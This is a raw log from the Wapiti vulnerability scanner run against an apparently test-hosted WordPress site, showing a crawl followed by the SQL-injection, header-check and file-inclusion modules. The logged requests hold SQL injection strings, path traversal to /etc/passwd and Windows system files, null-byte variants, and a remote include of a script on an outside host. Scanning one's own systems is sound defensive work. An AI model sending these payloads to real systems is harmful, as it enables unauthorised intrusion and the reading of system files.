2024-03-21 15:46:23.852 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:25.677 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/index.php?rest_route=%2F (1)
2024-03-21 15:46:25.678 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-includes/blocks/navigation/view.min.js (1)
2024-03-21 15:46:25.678 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-includes/wlwmanifest.xml (1)
2024-03-21 15:46:25.678 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xmlrpc.php (1)
2024-03-21 15:46:25.678 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/ (1)
2024-03-21 15:46:25.679 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xmlrpc.php?rsd (1)
2024-03-21 15:46:25.679 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/index.php (1)
2024-03-21 15:46:25.679 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-includes/blocks/navigation/view-modal.min.js (1)
2024-03-21 15:46:25.679 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/?feed=rss2 (1)
2024-03-21 15:46:25.679 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/?feed=comments-rss2 (1)
2024-03-21 15:46:27.942 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 15:46:27.943 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_5692e2fc.db
2024-03-21 15:46:27.947 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 11 URLs and forms during the scan
2024-03-21 15:46:28.025 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 15:46:28.026 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 15:46:28.128 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 15:46:28.297 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 15:46:28.297 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-21 15:46:28.317 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:28.318 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?xml=fuzz%C2%BF%27%22%28&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:30.054 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?xml=fuzz&result=fuzz%C2%BF%27%22%28&hc_action=delete_xml (0)
2024-03-21 15:46:31.751 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?xml=fuzz&result=success&hc_action=fuzz%C2%BF%27%22%28 (0)
2024-03-21 15:46:35.117 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz%20AND%2012%3D107%20AND%2082%3D82&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:36.851 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz%27%20AND%2061%3D97%20AND%20%2740%27%3D%2740&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:38.568 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz%22%20AND%2022%3D99%20AND%20%2252%22%3D%2252&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:40.311 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz%29%20AND%2022%3D64%20AND%20%2825%3D25&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:42.073 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz%27%29%20AND%2037%3D105%20AND%20%28%2760%27%3D%2760&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:43.921 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz%22%29%20AND%2053%3D79%20AND%20%28%2216%22%3D%2216&result=success&hc_action=delete_xml (0)
2024-03-21 15:46:45.668 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success%20AND%2026%3D97%20AND%2040%3D40&hc_action=delete_xml (0)
2024-03-21 15:46:47.401 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success%27%20AND%2023%3D54%20AND%20%2729%27%3D%2729&hc_action=delete_xml (0)
2024-03-21 15:46:49.223 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success%22%20AND%2042%3D94%20AND%20%2254%22%3D%2254&hc_action=delete_xml (0)
2024-03-21 15:46:50.948 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success%29%20AND%2067%3D149%20AND%20%2813%3D13&hc_action=delete_xml (0)
2024-03-21 15:46:52.691 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success%27%29%20AND%2034%3D77%20AND%20%28%2738%27%3D%2738&hc_action=delete_xml (0)
2024-03-21 15:46:54.420 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success%22%29%20AND%2058%3D134%20AND%20%28%2245%22%3D%2245&hc_action=delete_xml (0)
2024-03-21 15:46:56.160 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml%20AND%2026%3D71%20AND%2032%3D32 (0)
2024-03-21 15:46:57.905 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml%27%20AND%2097%3D184%20AND%20%2774%27%3D%2774 (0)
2024-03-21 15:46:59.607 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml%22%20AND%2089%3D151%20AND%20%2232%22%3D%2232 (0)
2024-03-21 15:47:01.316 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml%29%20AND%2059%3D101%20AND%20%2824%3D24 (0)
2024-03-21 15:47:03.021 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml%27%29%20AND%2072%3D149%20AND%20%28%2757%27%3D%2757 (0)
2024-03-21 15:47:04.743 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml%22%29%20AND%2036%3D117%20AND%20%28%2264%22%3D%2264 (0)
2024-03-21 15:47:06.438 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?feed=rss2 (1)
2024-03-21 15:47:06.438 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?feed=rss2%C2%BF%27%22%28 (1)
2024-03-21 15:47:07.731 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%20AND%2058%3D139%20AND%2086%3D86 (1)
2024-03-21 15:47:08.385 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%20AND%2030%3D110%20AND%2040%3D40 (1)
2024-03-21 15:47:09.043 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%20AND%2030%3D30%20AND%2037%3D37 (1)
2024-03-21 15:47:09.686 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%27%20AND%2099%3D121%20AND%20%2794%27%3D%2794 (1)
2024-03-21 15:47:10.336 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%27%20AND%2012%3D103%20AND%20%2796%27%3D%2796 (1)
2024-03-21 15:47:10.960 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%27%20AND%2069%3D69%20AND%20%2735%27%3D%2735 (1)
2024-03-21 15:47:11.603 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%22%20AND%2038%3D71%20AND%20%2268%22%3D%2268 (1)
2024-03-21 15:47:12.218 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%22%20AND%2010%3D102%20AND%20%2260%22%3D%2260 (1)
2024-03-21 15:47:12.844 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%22%20AND%2080%3D80%20AND%20%2254%22%3D%2254 (1)
2024-03-21 15:47:13.465 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%29%20AND%2012%3D108%20AND%20%2857%3D57 (1)
2024-03-21 15:47:14.067 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%29%20AND%2083%3D160%20AND%20%2844%3D44 (1)
2024-03-21 15:47:14.723 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%29%20AND%2058%3D58%20AND%20%2847%3D47 (1)
2024-03-21 15:47:15.418 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%27%29%20AND%2064%3D133%20AND%20%28%2789%27%3D%2789 (1)
2024-03-21 15:47:16.067 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%27%29%20AND%2083%3D113%20AND%20%28%2732%27%3D%2732 (1)
2024-03-21 15:47:16.698 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%27%29%20AND%2041%3D41%20AND%20%28%2735%27%3D%2735 (1)
2024-03-21 15:47:17.317 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%22%29%20AND%2042%3D107%20AND%20%28%2294%22%3D%2294 (1)
2024-03-21 15:47:17.963 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%22%29%20AND%2018%3D105%20AND%20%28%2296%22%3D%2296 (1)
2024-03-21 15:47:18.581 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=rss2%22%29%20AND%2017%3D17%20AND%20%28%2278%22%3D%2278 (1)
2024-03-21 15:47:19.192 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/ (1)
2024-03-21 15:47:20.901 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?feed=comments-rss2 (1)
2024-03-21 15:47:21.566 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%20AND%2098%3D183%20AND%2045%3D45 (1)
2024-03-21 15:47:22.188 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%20AND%2082%3D102%20AND%2055%3D55 (1)
2024-03-21 15:47:22.829 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%20AND%2078%3D78%20AND%2052%3D52 (1)
2024-03-21 15:47:23.448 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%27%20AND%2073%3D105%20AND%20%2799%27%3D%2799 (1)
2024-03-21 15:47:24.079 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%27%20AND%2072%3D84%20AND%20%2736%27%3D%2736 (1)
2024-03-21 15:47:24.681 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%27%20AND%2038%3D38%20AND%20%2789%27%3D%2789 (1)
2024-03-21 15:47:25.345 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%22%20AND%2049%3D129%20AND%20%2286%22%3D%2286 (1)
2024-03-21 15:47:25.981 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%22%20AND%2042%3D94%20AND%20%2246%22%3D%2246 (1)
2024-03-21 15:47:26.591 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%22%20AND%2094%3D94%20AND%20%2299%22%3D%2299 (1)
2024-03-21 15:47:27.259 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%29%20AND%2056%3D110%20AND%20%2891%3D91 (1)
2024-03-21 15:47:27.908 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%29%20AND%2011%3D99%20AND%20%2873%3D73 (1)
2024-03-21 15:47:28.545 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%29%20AND%2021%3D21%20AND%20%2895%3D95 (1)
2024-03-21 15:47:29.179 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%27%29%20AND%2095%3D113%20AND%20%28%2766%27%3D%2766 (1)
2024-03-21 15:47:29.843 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%27%29%20AND%2084%3D118%20AND%20%28%2738%27%3D%2738 (1)
2024-03-21 15:47:30.556 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%27%29%20AND%2074%3D74%20AND%20%28%2742%27%3D%2742 (1)
2024-03-21 15:47:31.204 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%22%29%20AND%2075%3D133%20AND%20%28%2214%22%3D%2214 (1)
2024-03-21 15:47:31.827 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%22%29%20AND%2026%3D43%20AND%20%28%2298%22%3D%2298 (1)
2024-03-21 15:47:32.434 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?feed=comments-rss2%22%29%20AND%2031%3D31%20AND%20%28%2255%22%3D%2255 (1)
2024-03-21 15:47:33.093 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/index.php?rest_route=%2F (1)
2024-03-21 15:47:33.093 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/index.php?rest_route=%2F%C2%BF%27%22%28 (1)
2024-03-21 15:47:34.734 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%20AND%2054%3D89%20AND%2024%3D24 (1)
2024-03-21 15:47:35.483 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%20AND%2045%3D138%20AND%2028%3D28 (1)
2024-03-21 15:47:36.242 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%20AND%2081%3D81%20AND%2033%3D33 (1)
2024-03-21 15:47:37.027 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%27%20AND%2070%3D135%20AND%20%2737%27%3D%2737 (1)
2024-03-21 15:47:37.843 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%27%20AND%2083%3D124%20AND%20%2740%27%3D%2740 (1)
2024-03-21 15:47:38.635 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%27%20AND%2053%3D53%20AND%20%2722%27%3D%2722 (1)
2024-03-21 15:47:39.394 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%22%20AND%2020%3D50%20AND%20%2294%22%3D%2294 (1)
2024-03-21 15:47:40.166 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%22%20AND%2022%3D99%20AND%20%2252%22%3D%2252 (1)
2024-03-21 15:47:40.953 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%22%20AND%2075%3D75%20AND%20%2260%22%3D%2260 (1)
2024-03-21 15:47:41.681 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%29%20AND%2029%3D88%20AND%20%2854%3D54 (1)
2024-03-21 15:47:42.466 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%29%20AND%2069%3D151%20AND%20%2834%3D34 (1)
2024-03-21 15:47:43.216 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%29%20AND%2041%3D41%20AND%20%2874%3D74 (1)
2024-03-21 15:47:43.965 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%27%29%20AND%2088%3D114%20AND%20%28%2710%27%3D%2710 (1)
2024-03-21 15:47:44.715 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%27%29%20AND%2043%3D105%20AND%20%28%2784%27%3D%2784 (1)
2024-03-21 15:47:45.460 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%27%29%20AND%2074%3D74%20AND%20%28%2716%27%3D%2716 (1)
2024-03-21 15:47:46.205 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%22%29%20AND%2040%3D112%20AND%20%28%2225%22%3D%2225 (1)
2024-03-21 15:47:46.928 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%22%29%20AND%2061%3D157%20AND%20%28%2220%22%3D%2220 (1)
2024-03-21 15:47:47.656 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/index.php?rest_route=%2F%22%29%20AND%2041%3D41%20AND%20%28%2239%22%3D%2239 (1)
2024-03-21 15:47:48.419 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/index.php (1)
2024-03-21 15:47:50.119 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-includes/blocks/navigation/view-modal.min.js (1)
2024-03-21 15:47:50.130 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-includes/blocks/navigation/view.min.js (1)
2024-03-21 15:47:50.138 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-includes/wlwmanifest.xml (1)
2024-03-21 15:47:50.148 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xmlrpc.php?rsd (1)
2024-03-21 15:47:50.149 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/xmlrpc.php?rsd=%C2%BF%27%22%28 (1)
2024-03-21 15:47:51.326 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xmlrpc.php?rsd=%20AND%2012%3D48%20AND%2078%3D78 (1)
2024-03-21 15:47:51.917 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xmlrpc.php?rsd=%27%20AND%2094%3D177%20AND%20%2724%27%3D%2724 (1)
2024-03-21 15:47:52.505 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xmlrpc.php?rsd=%22%20AND%2016%3D81%20AND%20%2229%22%3D%2229 (1)
2024-03-21 15:47:53.100 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xmlrpc.php?rsd=%29%20AND%2051%3D135%20AND%20%2878%3D78 (1)
2024-03-21 15:47:53.709 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xmlrpc.php?rsd=%27%29%20AND%2060%3D126%20AND%20%28%2792%27%3D%2792 (1)
2024-03-21 15:47:54.311 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/xmlrpc.php?rsd=%22%29%20AND%2099%3D112%20AND%20%28%2254%22%3D%2254 (1)
2024-03-21 15:47:54.905 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xmlrpc.php (1)
2024-03-21 15:47:55.559 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 15:47:55.579 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml (0)
2024-03-21 15:47:57.312 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 15:47:57.312 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-21 15:47:57.386 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 15:47:57.386 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-21 15:47:57.474 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/ (1)
2024-03-21 15:47:59.262 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 15:47:59.262 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-21 15:47:59.321 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 15:47:59.321 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-21 15:47:59.447 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 15:47:59.461 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?xml=fuzz&result=success&hc_action=delete_xml (0)
2024-03-21 15:47:59.463 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:01.190 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:02.905 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:04.616 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=%2Fetc%2Fpasswd%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:06.325 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:08.161 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:09.857 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:11.570 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:13.295 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:15.075 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:16.831 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:18.549 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:20.247 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:21.971 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:23.719 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:25.445 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:27.148 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:28.943 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:30.692 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:32.418 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:34.112 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:35.859 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&result=success&hc_action=delete_xml (0)
2024-03-21 15:48:37.693 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?xml=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&result=success&hc_action=delete_xml (0)
